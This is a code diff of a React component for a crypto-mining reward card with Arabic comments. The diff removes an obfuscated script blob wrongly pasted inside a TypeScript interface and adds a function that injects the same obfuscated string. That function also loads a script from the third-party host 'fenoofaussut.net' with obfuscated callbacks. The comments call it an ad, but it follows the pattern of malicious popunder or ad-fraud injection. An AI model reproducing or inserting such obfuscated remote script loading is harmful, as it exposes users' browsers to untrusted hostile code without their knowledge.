@@ -1,3 +1,5 @@
+// ⚠️ داخل الملف: MiningCard.tsx
+
 import { useEffect, useState } from 'react';
 import {
   doc,
@@ -25,14 +27,7 @@ ChartJS.register(CategoryScale, LinearScale, PointElement, LineElement, Tooltip)
 
 interface MiningCardProps {
   plan: 'economy' | 'business' | 'first-6' | 'first-lifetime';
-  onClaim
-
-<script data-cfasync="false" type="text/javascript">(function(){var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlop
-...
-
-})();</script>
-
-: (amount: number) => void;
+  onClaim: (amount: number) => void;
 }
 
 const planLimits: Record<string, number> = {
@@ -52,6 +47,7 @@ const MiningCard = ({ plan, onClaim }: MiningCardProps) => {
   const [firstTime, setFirstTime] = useState(false);
   const [isMaxed, setIsMaxed] = useState(false);
   const [history, setHistory] = useState<number[]>([]);
+  const [showUnlock, setShowUnlock] = useState(false); // 👈 إضافة حالة الزر
 
   const miningRate = planLimits[plan] ? planLimits[plan] / 43200 : 0;
 
@@ -162,6 +158,7 @@ const MiningCard = ({ plan, onClaim }: MiningCardProps) => {
     setClaimReady(false);
     setIsMaxed(false);
     sentNotification = false;
+    setShowUnlock(false); // 👈 إعادة تعيين الزر بعد التحصيل
 
     fetchUserData();
   };
@@ -175,6 +172,27 @@ const MiningCard = ({ plan, onClaim }: MiningCardProps) => {
     });
     setStartTime(new Date());
     setFirstTime(false);
+  };
+
+  // زر Unlock Rewards: يعرض الإعلان ويظهر زر Claim بعدها
+  const handleUnlockRewards = () => {
+    // 👇 إدراج سكربت الإعلان في الصفحة
+    const script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.dataset.cfasync = 'false';
+    script.innerHTML = `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlop';(()=>{})()})();`;
+    document.body.appendChild(script);
+
+    const script2 = document.createElement('script');
+    script2.src = '//fenoofaussut.net/ntfc.php?p=9386736';
+    script2.dataset.cfasync = 'false';
+    script2.async = true;
+    script2.onerror = () => (window as any)._uxlyx && (window as any)._uxlyx();
+    script2.onload = () => (window as any)._czeveqde && (window as any)._czeveqde();
+    document.body.appendChild(script2);
+
+    // 👇 بعد عرض الإعلان، نخفي زر Unlock Rewards ونُظهر زر Claim
+    setTimeout(() => setShowUnlock(false), 1000);
   };
 
   const formatTime = (seconds: number) => {
@@ -230,12 +248,42 @@ const MiningCard = ({ plan, onClaim }: MiningCardProps) => {
           <div className="h-full bg-yellow-500 transition-all duration-500" style={{ width: `${(mined / planLimits[plan]) * 100}%` }} />
         </div>
         <p className="text-sm text-gray-500 mb-4">{claimReady ? '✅ Ready to claim!' : `⏱️ Time remaining: ${formatTime(remainingTime)}`}</p>
-        <button onClick={handleClaim} disabled={!claimReady}
-          className={`w-full py-2 rounded-xl font-bold transition-all duration-300 ${
-            claimReady ? 'bg-yellow-500 hover:bg-yellow-400 text-black animate-pulse' : 'bg-gray-700 text-gray-400 cursor-not-allowed'
-          }`}>
-          {claimReady ? 'Claim Reward' : 'Mining in Progress'}
-        </button>
+
+        {/* 🔓 زر Unlock Rewards */}
+        {claimReady && !showUnlock && (
+          <button
+            onClick={() => setShowUnlock(true)}
+            className="w-full py-2 mb-2 rounded-xl font-bold transition bg-yellow-500 hover:bg-yellow-400 text-black animate-pulse"
+          >
+            Unlock Rewards
+          </button>
+        )}
+
+        {/* 💰 زر Claim Reward */}
+        {(!claimReady || showUnlock) && (
+          <button
+            onClick={claimReady ? handleClaim : undefined}
+            disabled={!claimReady}
+            className={`w-full py-2 rounded-xl font-bold transition-all duration-300 ${
+              claimReady ? 'bg-yellow-500 hover:bg-yellow-400 text-black animate-pulse' : 'bg-gray-700 text-gray-400 cursor-not-allowed'
+            }`}
+          >
+            {claimReady ? 'Claim Reward' : 'Mining in Progress'}
+          </button>
+        )}
+
+        {/* عند الضغط على Unlock Rewards */}
+        {showUnlock && claimReady && (
+          <div className="mt-4">
+            <button
+              onClick={handleUnlockRewards}
+              className="w-full py-2 rounded-xl font-bold bg-green-600 hover:bg-green-500 text-white transition animate-pulse"
+            >
+              Show Ads & Unlock Rewards
+            </button>
+          </div>
+        )}
+
         <div className="mt-6">
           <Line data={chartData} options={{ responsive: true, plugins: { legend: { display: false } } }} />
         </div>
